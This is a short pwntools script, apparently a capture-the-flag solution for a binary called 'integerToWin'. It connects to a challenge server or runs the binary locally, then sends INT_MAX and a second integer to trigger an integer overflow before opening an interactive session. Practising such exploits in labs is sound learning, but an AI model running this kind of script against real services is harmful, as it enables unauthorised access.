from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./integerToWin")

def start():
    if args.REMOTE:
        return remote("54.224.65.7", 10101)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()
io.sendline(b"2147483647")

io.recv()
io.sendline(b"2134112312")

io.interactive()